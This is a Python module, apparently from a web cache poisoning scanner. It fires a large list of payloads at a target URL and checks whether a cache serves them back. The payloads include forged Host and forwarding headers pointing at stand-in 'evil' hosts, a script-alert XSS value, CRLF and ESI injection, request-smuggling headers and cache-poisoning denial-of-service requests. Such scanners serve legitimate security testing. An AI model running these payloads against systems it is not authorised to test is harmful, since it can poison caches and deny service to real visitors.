import time
import uuid
import random
from typing import List, Dict, Optional
from cpd.http_client import HttpClient
from cpd.logic.baseline import Baseline
from cpd.utils.logger import logger

class Poisoner:
    def __init__(self, baseline: Baseline, headers: Dict[str, str] = None):
        self.baseline = baseline
        self.headers = headers or {}
        self.payload_id = str(uuid.uuid4())[:8]
        # Advanced poisoning signatures based on public writeups (HackerOne, Bugcrowd)
        self.signatures = [
            # Host Header Manipulation
            {"name": "X-Forwarded-Host", "header": "X-Forwarded-Host", "value": f"evil-{self.payload_id}.com"},
            {"name": "X-Host", "header": "X-Host", "value": f"evil-{self.payload_id}.com"},
            {"name": "X-Forwarded-Server", "header": "X-Forwarded-Server", "value": f"evil-{self.payload_id}.com"},
            {"name": "X-HTTP-Host-Override", "header": "X-HTTP-Host-Override", "value": f"evil-{self.payload_id}.com"},
            {"name": "Forwarded", "header": "Forwarded", "value": f"host=evil-{self.payload_id}.com;for=127.0.0.1"},
            
            # Request Line / Path Overrides
            {"name": "X-Original-URL", "header": "X-Original-URL", "value": f"/poison-{self.payload_id}"},
            {"name": "X-Rewrite-URL", "header": "X-Rewrite-URL", "value": f"/poison-{self.payload_id}"},
            
            # Protocol / Port Manipulation
            {"name": "X-Forwarded-Scheme", "type": "method_override", "header": "X-Forwarded-Scheme", "value": "http"},
            {"name": "X-Forwarded-Proto", "type": "method_override", "header": "X-Forwarded-Proto", "value": "http"},
            {"name": "X-Forwarded-Port", "header": "X-Forwarded-Port", "value": "1111"},
            {"name": "X-Forwarded-Prefix", "header": "X-Forwarded-Prefix", "value": f"/evil-{self.payload_id}"},
            
            # Header Reflection / Injection targets
            {"name": "Valid-User-Agent", "header": "User-Agent", "value": f"<script>alert('{self.payload_id}')</script>"},
            {"name": "Origin-Reflect", "header": "Origin", "value": f"https://evil-{self.payload_id}.com"},
            {"name": "Accept-Language", "header": "Accept-Language", "value": f"en-evil-{self.payload_id}"},
            {"name": "Accept-Language", "header": "Accept-Language", "value": f"en-evil-{self.payload_id}"},
            
            # Path Normalization / Traversal (User Requested)
            {"name": "Backslash-Path-Replace", "type": "path", "mutation": "backslash_replace"},
            {"name": "Backslash-Last-Path-Replace", "type": "path", "mutation": "backslash_last_slash"},
            
            # Fat GET (Body Poisoning)
            {"name": "Fat-GET", "type": "fat_get", "header": "X-Poison-Fat", "value": f"evil-{self.payload_id}"},

            # CDN / IP Forwarding
            {"name": "Fastly-Client-IP", "header": "Fastly-Client-IP", "value": "8.8.8.8"},
            {"name": "True-Client-IP", "header": "True-Client-IP", "value": "127.0.0.1"},
            {"name": "CF-Connecting-IP", "header": "CF-Connecting-IP", "value": "127.0.0.1"},
            {"name": "X-Real-IP", "header": "X-Real-IP", "value": "127.0.0.1"},
            {"name": "X-Forwarded-For-IP", "header": "X-Forwarded-For", "value": "127.0.0.1"},
            {"name": "Client-IP", "header": "Client-IP", "value": "127.0.0.1"},
            
            # Method Override (Behavioral)
            {"name": "Method-Override-POST", "type": "method_override", "header": "X-HTTP-Method-Override", "value": "POST"},
            {"name": "Method-Override-PUT", "type": "method_override", "header": "X-HTTP-Method-Override", "value": "PUT"},

            # Unkeyed Query Parameter
            {"name": "Unkeyed-Param", "type": "query_param", "param": "utm_content", "value": f"evil-{self.payload_id}"},
            {"name": "Parameter-Pollution", "type": "query_param", "param": "utm_source", "value": f"evil-{self.payload_id}"},

            # Header Reflection / Injection targets (Extended)
            {"name": "X-Forwarded-SSL", "header": "X-Forwarded-SSL", "value": "on"},
            {"name": "X-Cluster-Client-IP", "header": "X-Cluster-Client-IP", "value": "127.0.0.1"},
            {"name": "Akamai-Pragma", "header": "Pragma", "value": "akamai-x-cache-on"},
            {"name": "CF-Cache-Status", "header": "CF-Cache-Status", "value": "DYNAMIC"},
            {"name": "Referer-Reflect", "header": "Referer", "value": f"https://evil-{self.payload_id}.com"},
            {"name": "Cache-Control-Poison", "header": "Cache-Control", "value": "public, max-age=3600"},
            {"name": "X-Original-Host", "header": "X-Original-Host", "value": f"evil-{self.payload_id}.com"},
            {"name": "X-Forwarded-Path", "header": "X-Forwarded-Path", "value": f"/poison-{self.payload_id}"},
            {"name": "Surrogate-Control", "header": "Surrogate-Control", "value": "max-age=3600"},
            {"name": "Vary-Manipulation", "header": "Vary", "value": "X-Forwarded-Host"},
            {"name": "Accept-Encoding-Reflect", "header": "Accept-Encoding", "value": f"evil-{self.payload_id}"},
            {"name": "TE-Trailers", "type": "method_override", "header": "Transfer-Encoding", "value": "trailers"},
            {"name": "CRLF-Injection", "header": "X-Custom-Header", "value": f"%0d%0aSet-Cookie: evil={self.payload_id}"},
            {"name": "HAV-Cookie-Reflect", "header": "hav", "value": f"<script>alert('{self.payload_id}')</script>"},
            
            # WCD
            {"name": "Web-Cache-Deception", "type": "path", "mutation": "append_css", "value": f"/static/style.css?poison={self.payload_id}"},

            # Vercel / Next.js Targets
            {"name": "Vercel-IP-Country-US", "type": "method_override", "header": "x-vercel-ip-country", "value": "US"},
            {"name": "Vercel-Forwarded-For", "type": "method_override", "header": "x-vercel-forwarded-for", "value": "127.0.0.1"},
            {"name": "NextJS-RSC", "type": "method_override", "header": "RSC", "value": "1"},
            {"name": "NextJS-Router-State", "type": "method_override", "header": "Next-Router-State-Tree", "value": "1"},

            # Next.js Prefetch / Data Poisoning
            {"name": "NextJS-Middleware-Prefetch", "type": "method_override", "header": "X-Middleware-Prefetch", "value": "1"},
            {"name": "X-Middleware-Prefetch-Poison", "type": "method_override", "header": "X-Middleware-Prefetch", "value": "poison"},
            {"name": "NextJS-Data", "type": "method_override", "header": "X-Nextjs-Data", "value": "1"},
            {"name": "NextJS-Purpose-Prefetch", "type": "method_override", "header": "Purpose", "value": "prefetch"},
            {"name": "NextJS-Cache-Poison", "type": "method_override", "header": "Next-Router-Prefetch", "value": "1"},

            # Range Header Poisoning (DoS)
            {"name": "Range-Poisoning", "type": "method_override", "header": "Range", "value": "bytes=0-0"},

            # === CloudFront & AWS-specific ===
            {"name": "CloudFront-Viewer-Country", "method_override": "true", "header": "CloudFront-Viewer-Country", "value": "US"},
            {"name": "CloudFront-Is-Mobile", "type": "method_override", "header": "CloudFront-Is-Mobile-Viewer", "value": "true"},
            {"name": "CloudFront-Is-Desktop", "type": "method_override", "header": "CloudFront-Is-Desktop-Viewer", "value": "true"},
            {"name": "CloudFront-Forwarded-Proto", "type": "method_override", "header": "CloudFront-Forwarded-Proto", "value": "http"},

            # === Akamai-specific ===
            {"name": "Akamai-Origin-Hop", "header": "Akamai-Origin-Hop", "value": f"evil-{self.payload_id}.com"},
            {"name": "True-Client-IP-Akamai", "header": "True-Client-IP", "value": f"127.0.0.1; host=evil-{self.payload_id}.com"},

            # === Fastly Advanced ===
            {"name": "Fastly-FF", "header": "Fastly-FF", "value": f"!cache-{self.payload_id}"},
            {"name": "Fastly-SSL", "type": "method_override", "header": "Fastly-SSL", "value": "0"},
            {"name": "Surrogate-Capability", "header": "Surrogate-Capability", "value": f"abc=ESI/1.0; evil-{self.payload_id}"},

            # === Cache-Control Manipulation ===
            {"name": "Cache-Control-Override", "header": "X-Cache-Control", "value": "no-cache"},
            {"name": "Pragma-Override", "header": "X-Pragma", "value": f"poison-{self.payload_id}"},

            # === Vary Header Exploitation ===
            {"name": "Accept-Encoding-Vary", "header": "Accept-Encoding", "value": f"gzip;poison={self.payload_id}"},
            {"name": "Accept-Vary", "header": "Accept", "value": f"text/html;version={self.payload_id}"},
            {"name": "Cookie-Vary", "header": "Cookie", "value": f"cache_poison={self.payload_id}"},

            # === Referer-based Cache Keys ===
            {"name": "Referer-Poison", "header": "Referer", "value": f"https://evil-{self.payload_id}.com/"},
            {"name": "Referrer-Policy", "header": "Referrer-Policy", "value": f"unsafe-url; poison={self.payload_id}"},

            # === Content Negotiation ===
            {"name": "Accept-Charset", "header": "Accept-Charset", "value": f"utf-8;poison={self.payload_id}"},
            {"name": "Content-Type-Override", "header": "Content-Type", "value": f"text/html;charset=utf-{self.payload_id}"},

            # === Authentication/Session Headers (Unkeyed) ===
            {"name": "Authorization-Unkeyed", "header": "Authorization", "value": f"Bearer poison-{self.payload_id}"},
            {"name": "X-API-Key-Unkeyed", "header": "X-API-Key", "value": f"poison-{self.payload_id}"},
            {"name": "X-Auth-Token", "header": "X-Auth-Token", "value": f"poison-{self.payload_id}"},

            # === Edge-Side Includes (ESI) Injection ===
            {"name": "ESI-Include", "header": "X-ESI", "value": f"<esi:include src='https://evil-{self.payload_id}.com'/>"},

            # === WebSocket/Upgrade Headers ===
            {"name": "Upgrade-Header", "header": "Upgrade", "value": f"websocket; poison={self.payload_id}"},
            {"name": "Connection-Upgrade", "header": "Connection", "value": f"Upgrade, poison-{self.payload_id}"},

            # === Custom CDN Headers ===
            {"name": "X-CDN-Forward", "header": "X-CDN-Forward", "value": f"evil-{self.payload_id}.com"},
            {"name": "X-Edge-Location", "header": "X-Edge-Location", "value": f"poison-{self.payload_id}"},
            {"name": "X-Cache-Key", "header": "X-Cache-Key", "value": f"poison-{self.payload_id}"},

            # === URL Encoding Bypass ===
            {"name": "X-Forwarded-Host-Encoded", "header": "X-Forwarded-Host", "value": f"evil-{self.payload_id}.com%00"},
            {"name": "X-Original-URL-Encoded", "header": "X-Original-URL", "value": f"/%2e%2e/poison-{self.payload_id}"},

            # === Normalized Path Attacks ===
            {"name": "Path-Dot-Segment", "type": "path", "mutation": "dot_segment", "value": f"/./poison-{self.payload_id}"},
            {"name": "Path-Double-Dot", "type": "path", "mutation": "double_dot", "value": f"/../poison-{self.payload_id}"},
            {"name": "Path-Encoded-Slash", "type": "path", "mutation": "encoded_slash", "value": f"/%2fpoison-{self.payload_id}"},

            # === Request Smuggling Related ===
            {"name": "Transfer-Encoding", "type": "method_override", "header": "Transfer-Encoding", "value": f"chunked; poison={self.payload_id}"},
            {"name": "Content-Length-Mismatch", "type": "method_override", "header": "Content-Length", "value": "0"},
            {"name": "X-HTTP-Method", "type": "method_override", "header": "X-HTTP-Method", "value": f"POST; poison={self.payload_id}"},

            # === Mobile/Device Detection ===
            {"name": "X-Device-Type", "header": "X-Device-Type", "value": f"mobile-{self.payload_id}"},
            {"name": "X-Mobile-Group", "header": "X-Mobile-Group", "value": f"poison-{self.payload_id}"},
            {"name": "X-Tablet-Device", "type": "method_override", "header": "X-Tablet-Device", "value": "true"},

            # === Geo-Location Headers ===
            {"name": "X-Country-Code", "header": "X-Country-Code", "value": f"XX-{self.payload_id}"},
            {"name": "X-GeoIP-Country", "header": "X-GeoIP-Country", "value": f"POISON-{self.payload_id}"},
            {"name": "CF-IPCountry", "header": "CF-IPCountry", "value": f"XX-{self.payload_id}"},

            # === Custom Framework Headers ===
            {"name": "X-Laravel-Cache", "header": "X-Laravel-Cache", "value": f"poison-{self.payload_id}"},
            {"name": "X-Drupal-Cache", "header": "X-Drupal-Cache", "value": f"poison-{self.payload_id}"},
            {"name": "X-WordPress-Cache", "header": "X-WordPress-Cache", "value": f"poison-{self.payload_id}"},

            # === CORS-related ===
            {"name": "Access-Control-Request-Method", "header": "Access-Control-Request-Method", "value": f"POST; poison={self.payload_id}"},
            {"name": "Access-Control-Request-Headers", "header": "Access-Control-Request-Headers", "value": f"X-Poison-{self.payload_id}"},

            # === Proxy/Load Balancer Detection ===
            {"name": "X-ProxyUser-Ip", "header": "X-ProxyUser-Ip", "value": "127.0.0.1"},
            {"name": "WL-Proxy-Client-IP", "header": "WL-Proxy-Client-IP", "value": "127.0.0.1"},
            {"name": "Via-Header", "header": "Via", "value": f"1.1 poison-{self.payload_id}.com"},

            # === API Gateway Specific ===
            {"name": "X-Amzn-Trace-Id", "header": "X-Amzn-Trace-Id", "value": f"Root=1-{self.payload_id}"},
            {"name": "X-API-Version", "header": "X-API-Version", "value": f"poison-{self.payload_id}"},
            {"name": "X-Gateway-Host", "header": "X-Gateway-Host", "value": f"evil-{self.payload_id}.com"},

            # === Special Characters in Headers ===
            {"name": "Host-Newline-Injection", "header": "Host", "value": f"legitimate.com\r\nX-Poison: {self.payload_id}"},
            {"name": "X-Forwarded-CRLF", "header": "X-Forwarded-Host", "value": f"evil.com\r\nX-Poison: {self.payload_id}"},

            # === Cache Deception ===
            {"name": "Path-Static-Extension", "type": "path", "mutation": "static_extension", "value": f"/profile.css?poison={self.payload_id}"},
            {"name": "Path-Delimiter-Bypass", "type": "path", "mutation": "delimiter", "value": f"/api;.css?poison={self.payload_id}"},

            # === Query Parameter Mutations ===
            {"name": "Unkeyed-CB", "type": "query_param", "param": "cb", "value": f"{self.payload_id}"},
            {"name": "Unkeyed-Callback", "type": "query_param", "param": "callback", "value": f"poison_{self.payload_id}"},
            {"name": "Unkeyed-JSONP", "type": "query_param", "param": "jsonp", "value": f"evil_{self.payload_id}"},
            {"name": "Unkeyed-UTM-Source", "type": "query_param", "param": "utm_source", "value": f"poison-{self.payload_id}"},
            {"name": "Unkeyed-UTM-Campaign", "type": "query_param", "param": "utm_campaign", "value": f"poison-{self.payload_id}"},
            {"name": "Unkeyed-FbClid", "type": "query_param", "param": "fbclid", "value": f"poison_{self.payload_id}"},
            {"name": "Unkeyed-GClid", "type": "query_param", "param": "gclid", "value": f"poison_{self.payload_id}"},
            {"name": "Param-Cloaking-Semi", "type": "query_param", "param": "cb;poison", "value": f"evil-{self.payload_id}"},

            # === CPDoS (Cache Poisoning Denial of Service) ===
            {"name": "CPDoS-HMO-Connect", "type": "method_override", "header": "X-HTTP-Method-Override", "value": "CONNECT"},
            {"name": "CPDoS-HMO-Track", "type": "method_override", "header": "X-HTTP-Method-Override", "value": "TRACK"},
            {"name": "CPDoS-HHO-Oversize", "type": "method_override", "header": "X-Oversized-Header", "value": "A" * 4000},

            # === Framework & Cloud Specific ===
            {"name": "IIS-Translate-F", "header": "Translate", "value": "f"},
            {"name": "AWS-S3-Redirect", "header": "x-amz-website-redirect-location", "value": f"/evil-{self.payload_id}"},
            {"name": "Symfony-Debug-Host", "header": "X-Backend-Host", "value": f"evil-{self.payload_id}.com"},
            {"name": "Magento-Base-Url", "header": "X-Forwarded-Base-Url", "value": f"http://evil-{self.payload_id}.com"},
            {"name": "Akamai-Pragma-Expanded", "header": "Pragma", "value": "akamai-x-get-cache-key, akamai-x-get-true-cache-key, akamai-x-get-request-id"},
            {"name": "NextJS-Next-Url", "header": "x-next-url", "value": f"/evil-{self.payload_id}"},

            # === Additional Routing/Geo ===
            {"name": "X-Original-Request-URI", "header": "X-Original-Request-URI", "value": f"/poison-{self.payload_id}"},
            {"name": "X-Forwarded-Context", "header": "X-Forwarded-Context", "value": f"evil-{self.payload_id}"},
            {"name": "Base-Url", "header": "Base-Url", "value": f"http://evil-{self.payload_id}.com"},
            {"name": "X-Forwarded-Ssl-Off", "type": "method_override", "header": "X-Forwarded-Ssl", "value": "off"},
            {"name": "Front-End-Https-Off", "type": "method_override", "header": "Front-End-Https", "value": "off"},
            {"name": "X-Forwarded-By", "header": "X-Forwarded-By", "value": "127.0.0.1"},
            {"name": "X-Originating-IP", "header": "X-Originating-IP", "value": "127.0.0.1"},
            {"name": "X-Remote-IP", "header": "X-Remote-IP", "value": "127.0.0.1"},
            
            # === Content Negotiation ===
            {"name": "Accept-Json", "header": "Accept", "value": "application/json"},
            {"name": "Accept-Xml", "header": "Accept", "value": "application/xml"},

        ]

    async def run(self, client: HttpClient) -> List[Dict]:
        """
        Execute poisoning attacks.
        """
        logger.info(f"Starting poisoning attempts on {self.baseline.url}")
        
        import asyncio
        findings = []
        for sig in self.signatures:
            # Schedule each signature test as a concurrent task
            findings.append(asyncio.create_task(self._attempt_poison(client, sig)))
            
        results = await asyncio.gather(*findings)
        
        # Filter None results
        valid_findings = [r for r in results if r]
        return valid_findings

    async def _attempt_poison(self, client: HttpClient, signature: Dict[str, str]) -> Optional[Dict]:
        cache_buster = f"cb={int(time.time())}_{random.randint(1000,9999)}"
        headers = self.headers.copy()
        
        # Determine URLs based on signature type
        if signature.get("type") == "path":
            # Mutation logic
            if signature["mutation"] == "backslash_replace":
                # Replace valid path separators with backslashes
                # e.g. https://example.com/foo/bar -> https://example.com\foo\bar
                from urllib.parse import urlparse
                parsed = urlparse(self.baseline.url)
                
                # Reconstruct with backslashes in path
                malicious_path = parsed.path.replace('/', '\\')
                if not malicious_path or malicious_path == '\\':
                     malicious_path = '\\' # Ensure at least root
                
                # Rebuild URL: scheme://netloc + malicious_path + query
                # We append cache buster manually
                target_url = f"{parsed.scheme}://{parsed.netloc}{malicious_path}?{cache_buster}"
                verify_url = f"{self.baseline.url}?{cache_buster}" if '?' not in self.baseline.url else f"{self.baseline.url}&{cache_buster}"
            
            elif signature["mutation"] == "backslash_last_slash":
                # Replace ONLY the LAST slash in the path with a backslash
                # e.g. /path1/subpath/path -> /path1/subpath\path
                from urllib.parse import urlparse
                parsed = urlparse(self.baseline.url)
                path = parsed.path
                
                if '/' in path:
                    # Rfind to locate last slash, replace it
                    last_slash_index = path.rfind('/')
                    # Be careful if it's the very first char and only char e.g. "/"
                    if last_slash_index != -1:
                        malicious_path = path[:last_slash_index] + '\\' + path[last_slash_index+1:]
                        if malicious_path == '\\': 
                             pass # "/" -> "\" is same as replace all, effectively
                    else:
                        malicious_path = path 
                else:
                    malicious_path = path
                
                target_url = f"{parsed.scheme}://{parsed.netloc}{malicious_path}?{cache_buster}"
                verify_url = f"{self.baseline.url}?{cache_buster}" if '?' not in self.baseline.url else f"{self.baseline.url}&{cache_buster}"

            elif signature["mutation"] == "append_css" or signature["mutation"] == "static_extension":
                # Web Cache Deception: Append non-existent static extension
                # e.g. /my/account -> /my/account/style.css?poison=123
                from urllib.parse import urlparse
                parsed = urlparse(self.baseline.url)
                path = parsed.path
                
                # If path is /foo and value is /bar.css -> /foo/bar.css
                if path.endswith('/'):
                    malicious_path = path.rstrip('/') + signature['value']
                else:
                    malicious_path = path + signature['value']
                    
                target_url = f"{parsed.scheme}://{parsed.netloc}{malicious_path}&{cache_buster}" if '?' in malicious_path else f"{parsed.scheme}://{parsed.netloc}{malicious_path}?{cache_buster}"
                verify_url = f"{self.baseline.url}?{cache_buster}" if '?' not in self.baseline.url else f"{self.baseline.url}&{cache_buster}"

            elif signature["mutation"] in ["dot_segment", "double_dot", "delimiter"]:
                # Path encodings/traversals
                # dot_segment: /path + /./poison
                # double_dot: /path + /../poison
                # delimiter: /path + ;.css
                from urllib.parse import urlparse
                parsed = urlparse(self.baseline.url)
                path = parsed.path
                
                malicious_path = path + signature['value']
                
                target_url = f"{parsed.scheme}://{parsed.netloc}{malicious_path}?{cache_buster}"
                verify_url = f"{self.baseline.url}?{cache_buster}" if '?' not in self.baseline.url else f"{self.baseline.url}&{cache_buster}"

            elif signature["mutation"] == "encoded_slash":
                # Encoded slash: replace / with %2f or append
                # value: /%2fpoison
                from urllib.parse import urlparse
                parsed = urlparse(self.baseline.url)
                path = parsed.path
                
                malicious_path = path + signature['value']
                
                target_url = f"{parsed.scheme}://{parsed.netloc}{malicious_path}?{cache_buster}"
                verify_url = f"{self.baseline.url}?{cache_buster}" if '?' not in self.baseline.url else f"{self.baseline.url}&{cache_buster}"

        
        elif signature.get("type") == "fat_get":
             # Fat GET: Send GET request with a body
             target_url = f"{self.baseline.url}?{cache_buster}" if '?' not in self.baseline.url else f"{self.baseline.url}&{cache_buster}"
             verify_url = target_url
        
        elif signature.get("type") == "query_param":
             # Inject parameter into URL
             # e.g. /?cb=123&utm_content=evil
             param_str = f"{signature['param']}={signature['value']}"
             target_url = f"{self.baseline.url}?{cache_buster}&{param_str}" if '?' not in self.baseline.url else f"{self.baseline.url}&{cache_buster}&{param_str}"
             # Check if clean request gets poisoned content
             verify_url = f"{self.baseline.url}?{cache_buster}" if '?' not in self.baseline.url else f"{self.baseline.url}&{cache_buster}"

        else:
            # Standard Header Poisoning (and Method Override)
            target_url = f"{self.baseline.url}?{cache_buster}" if '?' not in self.baseline.url else f"{self.baseline.url}&{cache_buster}"
            verify_url = target_url
            headers[signature['header']] = signature['value']

        logger.debug(f"Attempting {signature['name']} on {target_url}")
        
        body = None
        if signature.get("type") == "fat_get":
             body = f"callback=evil{self.payload_id}"

        resp = await client.request("GET", target_url, headers=headers, data=body)
        if not resp:
            return

        # 2. Verification Request (Clean URL with same cache key/buster)
        verify_resp = await client.request("GET", verify_url, headers=self.headers)
        if not verify_resp:
            return

        if signature.get("type") in ["path", "method_override"]:
            # Calculate verify hash
            import hashlib
            verify_hash = hashlib.sha256(verify_resp['body']).hexdigest()
            
            if verify_resp['body'] == resp['body'] and verify_hash != self.baseline.body_hash:
                 verify_resp_2 = await client.request("GET", verify_url, headers=self.headers)
                 if not verify_resp_2:
                     return None
                 
                 verify_hash_2 = hashlib.sha256(verify_resp_2['body']).hexdigest()
                 
                 if verify_hash != verify_hash_2:
                     logger.debug(f"Ignored {signature['name']} - Target appears dynamic (verification requests differed)")
                     return None

                 fresh_cb = f"cb={int(time.time())}_{random.randint(1000,9999)}"
                 fresh_url = f"{self.baseline.url}?{fresh_cb}" if '?' not in self.baseline.url else f"{self.baseline.url}&{fresh_cb}"
                 
                 fresh_resp = await client.request("GET", fresh_url, headers=self.headers)
                 if fresh_resp:
                     fresh_hash = hashlib.sha256(fresh_resp['body']).hexdigest()
                     if fresh_hash == verify_hash:
                         logger.debug(f"Ignored {signature['name']} - Target appears to have drifted (fresh baseline matches verification)")
                         return None
                     
                     if fresh_resp['status'] == verify_resp['status']:
                         len_fresh = len(fresh_resp['body'])
                         len_verify = len(verify_resp['body'])
                         if len_fresh == len_verify:
                             logger.debug(f"Ignored {signature['name']} - Content length identical to fresh baseline ({len_verify} bytes). Likely benign dynamic content.")
                             return None
                         
                         # Optional: Tolerance check (e.g., < 20 bytes diff)
                         if abs(len_fresh - len_verify) < 20:
                             logger.debug(f"Ignored {signature['name']} - Content length similar to fresh baseline (diff {abs(len_fresh - len_verify)}). Likely benign.")
                             return None
                     
                     if fresh_hash != self.baseline.body_hash:
                         logger.debug(f"Ignored {signature['name']} - Target appears chaotic (fresh baseline != original baseline)")
                         return None

                 vuln_type = "PathNormalizationPoisoning" if signature.get("type") == "path" else "MethodOverridePoisoning"
                 msg = f"POTENTIAL VULNERABILITY: {vuln_type}. Clean URL {verify_url} served content from {target_url} (reproducing malicious behavior)"
                 logger.critical(msg)
                 return {
                     "url": self.baseline.url,
                     "target_url": target_url,
                     "verify_url": verify_url,
                     "vulnerability": vuln_type,
                     "details": msg,
                     "signature": signature,
                     "severity": "HIGH"
                 }
            return None

        if signature['value'] in str(verify_resp['headers']) or signature['value'] in str(verify_resp['body']):
             # Ignore short values (DoS/False Positive prevention)
             if len(signature['value']) < 5:
                 logger.debug(f"Ignored {signature['name']} - Value '{signature['value']}' too short for reliable reflection check")
                 return None

             # False Positive Check: Was this value already in the baseline (body OR headers)?
             in_baseline = signature['value'] in str(self.baseline.body) or signature['value'] in str(self.baseline.headers)
             if in_baseline:
                 logger.debug(f"Ignored {signature['name']} - Value '{signature['value']}' found in baseline response")
                 return None

             msg = f"POTENTIAL VULNERABILITY: {signature['name']} reflected in response for {target_url}"
             logger.critical(msg)
             severity = "MEDIUM"
             if "<script" in str(verify_resp['body']):
                  severity = "CRITICAL"
             elif signature.get("type") in ["fat_get", "query_param"]:
                  severity = "HIGH"

             return {
                 "url": self.baseline.url,
                 "target_url": target_url,
                 "vulnerability": "CachePoisoning",
                 "details": msg,
                 "signature": signature,
                 "severity": severity
             }
        else:
             logger.debug(f"Failed {signature['name']}")
             return None
